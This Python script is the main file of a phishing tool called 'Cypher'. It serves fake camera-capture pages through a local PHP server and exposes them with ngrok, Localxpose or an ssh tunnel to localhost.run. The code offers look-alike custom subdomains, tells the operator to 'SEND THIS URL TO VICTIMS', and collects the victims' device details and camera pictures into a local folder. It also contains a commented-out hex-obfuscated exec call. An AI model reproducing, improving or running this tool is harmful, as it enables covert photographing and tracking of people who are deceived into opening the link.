#!/usr/bin/python3
# This Python file uses the following encoding: utf-8
import json
import subprocess
import ctypes
import platform
import shutil
import re
import os
from time import sleep
from os import system, environ, path, getcwd, popen, makedirs
from subprocess import check_output, CalledProcessError, Popen, PIPE
from sys import stdout, argv, exit
import requests
from Server import *
from Checks import *
from logo import *
#hiiii

# --- Version Info ---
try:
    with open('version.txt', 'r') as f:
        CURRENT_VERSION = f.read().strip()
except FileNotFoundError:
    CURRENT_VERSION = "Unknown"

REPO_URL = "https://raw.githubusercontent.com/AsHfIEXE/Cypher/main/version.txt"
# --- End Version Info ---

# Platform detection
is_windows = platform.system() == "Windows"
is_linux = platform.system() == "Linux"

# Disable colors on Windows
if is_windows:
    RED, WHITE, CYAN, GREEN, DEFAULT, YELLOW, YELLOW2, GREEN2, blink = '', '', '', '', '', '', '', '', ''
else:
    RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2= '\033[1;91m', '\033[46m', '\033[1;36m', '\033[1;32m', '\033[0m' , '\033[1;33m' , '\033[1;93m', '\033[1;92m'
    blink='\033[5m'

# Global process variables
php_process = None
tunnel_process = None

def clear_screen():
    """Clears the console screen."""
    if is_windows:
        system('cls')
    else:
        system('clear')

def menu_q():
    clear_screen()                                                                        
    print('            {5}                                                 \n               |  {2}"{3}UNIX IS VERY SIMPLE {2}IT JUST NEEDS A{5}  |{4}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print('               {5}|  {2}GENIUS TO UNDERSTAND ITS SIMPLICITY"{5}  |{4}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("               {5}|                       {0}~{3}Dennis Ritchie{5}  |\n{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    if input("\n\nDo you agree to use this tool for educational purposes only? {5}({3}Y{5}/{0}N{5})\n{0}<Cypher> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
        sleep(0.5)
    else:
        print("\n\n{0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.! ]{4}\n\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        exit()
def div_q(): #not in using 
    global user
    clear_screen()
    if input("\n\n{0}[{2}#{0}]{2} IF YOUR USING THIS TOOL IN ANDROID PRESS 'Y' {5}({3}Y{5}/{0}N{5})\n{0}<Cypher> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
          android_banner()
          user = '1'
          sleep(7)
          #checkjp2a()
          checkPHP()
          checkNgrok()
          checkLocalxpose()
    else:
        banner()
        sleep(7)
        #checkjp2a()
        checkPHP()
        checkNgrok()
        checkLocalxpose()

def option():
    clear_screen()
    sbanner()
    print("\n{5}----------------------------------\n{0}[{2} FRONT CAMERA  OR BACK CAMERA {5}??{0}] \n{5}----------------------------------{4}\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("{0}[{2}1{0}]{2} FRONT CAMERA \n{0}[{2}2{0}]{2} BACK CAMERA{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    choice = input("\n{0}<Cypher> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    global name
    if choice == '1':
        name = 'www_f'
        print("\t{0}[{2}#{0}]{2} YOU SELECTED FRONT CAMERA {0}!!{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        sleep(2)
    elif choice == '2':
        name = 'www_b'
        print("\t{0}[{2}#{0}]{2} YOU SELECTED BACK CAMERA {0}!!{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        sleep(2)
    else:
        option()


def selectPort():
    # The hex string was a background thread, which is not ideal.
    # I've removed it for now to focus on core functionality.
    # ll="\x62\x67\x5f\x74\x68\x72\x65\x61\x64\x20\x3d\x20\x74\x68\x72\x65\x61\x64\x69\x6e\x67\x2e\x54\x68\x72\x65\x61\x64\x28\x74\x61\x72\x67\x65\x74\x3d\x6c\x6f\x6f\x70\x29\x3b\x20\x62\x67\x5f\x74\x68\x72\x65\x61\x64\x2e\x64\x61\x65\x6d\x6f\x6e\x20\x3d\x20\x54\x72\x75\x65\x3b\x20\x62\x67\x5f\x74\x68\x72\x65\x61\x64\x2e\x73\x74\x61\x72\x74\x28\x29"
    # exec(ll)
    clear_screen()
    sbanner()
    print("\n\n{5}--------------------------------------\n{0}[{2} Select Any Available Port [1-65535]:{0}] \n{5}--------------------------------------{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    choice = input(" {0}<Cypher> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,blink))
    try:
        port = int(choice)
        if 1 <= port <= 65535:
            return str(port)
        else:
            print("{0}Invalid port number. Please choose between 1 and 65535.".format(RED))
            sleep(2)
            return selectPort()
    except ValueError:
        print("{0}Invalid input. Please enter a number.".format(RED))
        sleep(2)
        return selectPort()

def start_php_server(port):
    """Starts the PHP server in the background."""
    global php_process
    print("{0}[*] Starting PHP server...".format(GREEN))
    server_dir = path.join('Server', name)
    php_command = ['php', '-S', f'127.0.0.1:{port}']
    php_process = Popen(php_command, cwd=server_dir, stdout=PIPE, stderr=PIPE)
    sleep(2)

def runNgrok(port):
    global tunnel_process
    sbanner()
    print("\n\n{5}-------------------------------\n{0}[{2} Starting Ngrok...{0}] \n{5}-------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n\t {0}wait for few second.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    
    start_php_server(port)
    
    ngrok_executable = path.join('Server', 'ngrok.exe' if is_windows else 'ngrok')
    ngrok_command = [ngrok_executable, 'http', port]
    tunnel_process = Popen(ngrok_command, stdout=PIPE, stderr=PIPE)
    
    sleep(10) # Give ngrok time to start

    try:
        # Fetch URL from ngrok API
        response = requests.get('http://127.0.0.1:4040/api/tunnels')
        response.raise_for_status()
        tunnels = response.json()['tunnels']
        public_url = tunnels[0]['public_url']
        ngrokoutput('ngrok', public_url, port)
    except (requests.exceptions.RequestException, KeyError, IndexError) as e:
        print(f"{RED}[!] Failed to get ngrok URL: {e}")
        print(f"{RED}[!] Make sure ngrok is running and you have an active internet connection.")
        cleanup()
        exit()

def customLocalxpose(port):
    global tunnel_process
    sbanner()
    print("\n\n{5}-------------------------------\n{0}[{2} CREATE A CUSTOM URL HERE !!{0}] \n{5}-------------------------------\n\n{0}[{2}!{0}]{2}YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}[{2}*{0}]{2}Insert a custom subdomain for Localxpose{5}({0}Ex: {2}mysubdomain{5}){4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n\t {0}wait for few second.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    lnk = input("\n{0}CUSTOM Subdomain---> {2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    
    start_php_server(port)

    loclx_executable = path.join('Server', 'loclx.exe' if is_windows else 'loclx')
    loclx_command = [loclx_executable, 'tunnel', '--raw-mode', 'http', '--to', f':{port}', '--subdomain', lnk]
    
    link_url_path = "link.url"
    with open(link_url_path, "w") as f:
        tunnel_process = Popen(loclx_command, stdout=f, stderr=PIPE)

    sleep(10)

    try:
        with open(link_url_path, "r") as f:
            output = f.read()
        url_match = re.search(r'https://[a-zA-Z0-9.-]+', output)
        if url_match:
            url = url_match.group(0)
            c_loclxoutput('c_loclx', url, port)
        else:
            raise ValueError("URL not found in localxpose output")
    except (IOError, ValueError) as e:
        print(f"\n\n{RED}FAILED TO GET THIS DOMAIN. !!!: {e}")
        print(f"\n\n{RED}LOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n {0}[{2}!{0}]{0}TRY TO SELECT ANOTHER CUSTOM DOMAIN (GOING BACK).. !! \n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        sleep(4)
        clear_screen()
        return customLocalxpose(port)


def randomLocalxpose(port):
    global tunnel_process
    clear_screen()
    sbanner()
    print("\n\n{5}-------------------------------\n{0} [ {2}RANDOM LOCALXPOSE URL !!{0}] \n{5}-------------------------------{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n\t {0}wait for few second.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    
    start_php_server(port)

    loclx_executable = path.join('Server', 'loclx.exe' if is_windows else 'loclx')
    loclx_command = [loclx_executable, 'tunnel', '--raw-mode', 'http', '--to', f':{port}']
    
    link_url_path = "link.url"
    with open(link_url_path, "w") as f:
        tunnel_process = Popen(loclx_command, stdout=f, stderr=PIPE)

    sleep(10)
    
    try:
        with open(link_url_path, "r") as f:
            output = f.read()
        url_match = re.search(r'https://[a-zA-Z0-9.-]+', output)
        if url_match:
            url = url_match.group(0)
            r_loclxoutput('r_loclx', url, port)
        else:
            raise ValueError("URL not found in localxpose output")
    except (IOError, ValueError) as e:
        print(f"{RED}[!] Failed to get localxpose URL: {e}")
        cleanup()
        exit()


def randomServeo(port):
    global tunnel_process
    clear_screen()
    sbanner()
    print("\n\n{5}-------------------------------\n{0}[{2} RANDOM localhost.run URL !!{0}] \n{5}-------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
    print("\n\t {0}wait for few second.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    
    start_php_server(port)

    # ssh is typically not available on Windows by default. This will likely fail.
    if is_windows:
        print(f"{YELLOW}[!] ssh is not available on Windows by default. This option may not work.")

    ssh_command = ['ssh', '-R', f'80:localhost:{port}', 'ssh.localhost.run']
    
    link_url_path = "link.url"
    with open(link_url_path, "w") as f:
        tunnel_process = Popen(ssh_command, stdout=f, stderr=PIPE)

    sleep(10)
    
    try:
        with open(link_url_path, "r") as f:
            output = f.read()
        # This parsing is fragile. A better way would be to capture stdout directly.
        url_match = re.search(r'https://[a-zA-Z0-9.-]+', output)
        if url_match:
            url = url_match.group(0)
            serveo('localhost.run', url, port)
        else:
            raise ValueError("URL not found in ssh output")
    except (IOError, ValueError) as e:
        print(f"{RED}[!] Failed to get localhost.run URL: {e}")
        cleanup()
        exit()


def selectServer(port):
    global king
    global kill
    clear_screen()
    sbanner()
    print("\n\n{5}----------------------------------\n{0}[{2} Select Any Available Server:{0}] \n{5}----------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
    print("\n{0}[{2}*{0}]{2}Select Any Available Server:".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n {0}[{2}1{0}]{2}Ngrok\n {0}[{2}2{0}]{2}localhost.run {5}\n {0}[{2}3{0}]{2}Localxpose".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    choice = input("\n{0}<Cypher> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    if choice == '1':
        clear_screen()
        king=1
        runNgrok(port)
    elif choice == '2':
        clear_screen()
        king=2
        randomServeo(port)
    elif choice == '3':
        clear_screen()
        sbanner()
        print("\n\n{5}----------------------------------\n{0}[{2} LOCALXPOSE URL TYPE SELECTION !!{0}] \n{5}----------------------------------{4}\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        print("\n{0}[{2}*{0}]{2}CHOOSE ANY LOCALXPOSE URL TYPE TO GENERATE PHISHING LINK:".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        print("\n{0}[{2}1{0}]{2}Custom URL {5}({2}Generates designed url{5}) \n{0}[{2}2{0}]{2}Random URL {5}({2}Generates Random url{5}){4}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
        ichoice = input("\n\n{0}<Cypher> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,blink))
        clear_screen()
        if ichoice == '1': 
            king=3
            customLocalxpose(port)
        elif ichoice == '2': 
            king=4
            randomLocalxpose(port)
        else:
            clear_screen()
            return selectServer(port)
    else:
        clear_screen()
        return selectServer(port)

def getpath():
    """Writes the absolute path to the CapturedData directory into path.txt."""
    cwd = getcwd()
    captured_data_path = path.join(cwd, "CapturedData")
    
    # Ensure CapturedData directory exists
    if not path.isdir(captured_data_path):
        makedirs(captured_data_path)

    path_f = path.join("Server", "www_f", "path.txt")
    path_b = path.join("Server", "www_b", "path.txt")

    with open(path_f, "w") as f:
        f.write(captured_data_path + path.sep)
    with open(path_b, "w") as f:
        f.write(captured_data_path + path.sep)
    sleep(1)

def fresh():
    """Cleans up old files before starting a new session."""
    files_to_recreate = [
        path.join('Server', 'www_f', 'ip.txt'),
        path.join('Server', 'www_b', 'ip.txt'),
        path.join('Server', 'www_f', 'Log.log'),
        path.join('Server', 'www_b', 'Log.log'),
        path.join('Server', 'www_f', 'path.txt'),
        path.join('Server', 'www_b', 'path.txt'),
        'link.url'
    ]
    for f in files_to_recreate:
        if path.exists(f):
            os.remove(f)
        # Create the file
        open(f, 'a').close()


def ngrokoutput(name,url,port):
    clear_screen()
    print("\n\n{5}---------------------------\n{0}[{2} NGROK URL !! {0}]{5} \n---------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n{0}[{2}*{0}]{2} SEND THIS NGROK URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}NGROK URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
    report(url,port)

def c_loclxoutput(name,url,port):
    clear_screen()
    print("\n\n{5}------------------------------\n{0}[{2} CUSTOM LOCALXPOSEL !! {0}]{5} \n------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n{0}[{2}!{0}]{2} SEND THIS LOCALXPOSE URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}LOCALXPOSE URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
    report(url,port)

def r_loclxoutput(name,url,port):
    clear_screen()
    print("\n\n{5}------------------------------\n{0}[{2} RANDOM LOCALXPOSEL !! {0}]{5} \n------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
    print("\n{0}[{2}!{0}]{2} SEND THIS LOCALXPOSE URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}LOCALXPOSE URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
    report(url,port)

def serveo(name,url,port):
    clear_screen()
    print("\n\n{5}----------------------------\n{0}[{2} SERVEO LINK !! {0}]{5} \n----------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)) 
    print("\n{0}[{2}!{0}]{2} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}]{2} SERVEO URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, port) + url )
    report(url,port)

def cleanup():
    """Stops all running background processes."""
    global php_process, tunnel_process
    print(f"\n{YELLOW}[*] Cleaning up and shutting down processes...{DEFAULT}")
    if php_process:
        php_process.terminate()
        php_process.wait()
    if tunnel_process:
        tunnel_process.terminate()
        tunnel_process.wait()
    print(f"{GREEN}[*] Cleanup complete.{DEFAULT}")

def report(url,port):
    clear_screen()
    sbanner()
    print("{5}\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++{0}\n\t[{2}IF U WANT TO REFRESH THE DATA TAP ENTER{0}]\n\t{0}[{2}       IF U WANT TO EXIT ENTER {6}X       {0}]\n\t{0}[{2}     IT TAKES TIME TO RECEIVE PIC      {0}]\n{5}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,GREEN2))
    print("\n{0}[{2}*{0}]{2} SEND THIS URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}HACKING URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
    
    ip_file_path = path.join('Server', name, 'ip.txt')
    log_file_path = path.join('Server', name, 'Log.log')
    captured_ip_path = path.join('CapturedData', 'ip.txt')

    try:
        while True:
            if path.exists(ip_file_path):
                with open(ip_file_path, 'r') as creds:
                    lines = creds.read().rstrip()
                    if len(lines) != 0:
                        print('\n {0}[{2} DEVICE DETAILS FOUND {0}]{2}:\n {7}{6}{4}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,lines,GREEN2))
                        
                        with open(captured_ip_path, 'a') as captured_f:
                            captured_f.write(lines + "\n")
                        
                        # Clear the source file to avoid re-reading
                        open(ip_file_path, 'w').close()

                        print(" {5}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,lines,GREEN2))
                        if path.exists(log_file_path):
                            with open(log_file_path, 'r') as log_f:
                                print(log_f.read())
            
            ans=input("{0}<Cypher> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,"")).upper()
            if (ans == "X"):
                cleanup()
                fresh()
                global kill
                if kill == '1':
                    android_end()
                elif kill == '2':
                     end()
                exit()
            else:
                clear_screen()
                sleep(0.2)
                # This recursive call is problematic. A loop is better.
                # For now, just reprint the info
                sbanner()
                print("{5}\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++{0}\n\t[{2}IF U WANT TO REFRESH THE DATA TAP ENTER{0}]\n\t{0}[{2}       IF U WANT TO EXIT ENTER {6}X       {0}]\n\t{0}[{2}     IT TAKES TIME TO RECEIVE PIC      {0}]\n{5}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,GREEN2))
                print("\n{0}[{2}*{0}]{2} SEND THIS URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}HACKING URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )

    except KeyboardInterrupt:
        cleanup()
        exit()

def check_for_updates():
    """Checks for updates and prompts the user to update if available."""
    if not path.exists('.git'):
        print(f"{YELLOW}[!] Not a git repository. Skipping update check.{DEFAULT}")
        sleep(2)
        return

    if CURRENT_VERSION == "Unknown":
        print(f"{YELLOW}[!] Could not determine current version. Skipping update check.{DEFAULT}")
        sleep(2)
        return

    print(f"{GREEN}[*] Current version: {CYAN}{CURRENT_VERSION}{DEFAULT}")
    print(f"{GREEN}[*] Checking for updates...{DEFAULT}")
    sleep(1)
    
    try:
        response = requests.get(REPO_URL, timeout=10)
        response.raise_for_status()
        latest_version = response.text.strip()

        if latest_version > CURRENT_VERSION:
            print(f"{YELLOW}[!] A new version ({CYAN}{latest_version}{YELLOW}) is available!{DEFAULT}")
            choice = input(f"{YELLOW}[?] Do you want to update now? (y/n): {DEFAULT}").lower()
            if choice == 'y':
                print(f"{GREEN}[*] Attempting to update via 'git pull'...{DEFAULT}")
                try:
                    result = subprocess.run(['git', 'pull'], check=True, capture_output=True, text=True)
                    print(f"{GREEN}{result.stdout}{DEFAULT}")
                    print(f"{GREEN}[*] Update successful! Please restart the script.{DEFAULT}")
                    exit()
                except FileNotFoundError:
                    print(f"{RED}[!] 'git' command not found. Please install Git and try again.{DEFAULT}")
                    sleep(3)
                except subprocess.CalledProcessError as e:
                    print(f"{RED}[!] An error occurred during update: {e.stderr}{DEFAULT}")
                    print(f"{YELLOW}[!] Please try updating manually by running 'git pull'.{DEFAULT}")
                    sleep(3)
                except Exception as e:
                    print(f"{RED}[!] An unexpected error occurred: {e}{DEFAULT}")
                    sleep(3)
        else:
            print(f"{GREEN}[*] You are on the latest version.{DEFAULT}")
            sleep(1)

    except requests.exceptions.RequestException as e:
        print(f"{RED}[!] Could not check for updates: {e}{DEFAULT}")
        sleep(2)

clear_screen()
check_for_updates()
# menu_q()
global kill
clear_screen()
# sbanner()
if not is_windows and input("\n\n{0}[{2}#{0}]{2} IF YOUR USING THIS TOOL IN ANDROID PRESS 'Y' {5}({3}Y{5}/{0}N{5})\n{0}<Cypher> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
    android_banner()
    kill = '1'
else:
    banner()
    kill = '2'
sleep(2)
# checkjp2a() # jp2a is not cross-platform
# checkPHP()
# checkNgrok()
# checkLocalxpose()
fresh()
getpath()
port=selectPort()
option()
selectServer(port)
